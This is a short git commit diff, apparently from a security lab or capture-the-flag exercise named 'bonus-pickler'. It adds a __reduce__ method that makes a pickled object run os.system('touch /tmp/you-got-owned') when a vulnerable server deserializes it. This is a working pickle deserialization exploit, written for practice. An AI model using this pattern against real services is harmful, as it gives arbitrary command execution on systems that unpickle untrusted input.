ae585009502be55f48399149e917506f4ff312c5
sec673 <673@673.local>
2025-12-04 16:26:01 -0500

    solved bonus-pickler

--- bonus-pickler/serialize_me.py
+++ bonus-pickler/serialize_me.py
@@ -1,3 +1,6 @@
+import os
 #This object is serialize by attacker.py and sent to vulnerable_server
 class MyClass(object):
       myattr = "ECHO THIS"
+      def __reduce__(self):
+            return (os.system, ('touch /tmp/you-got-owned',))
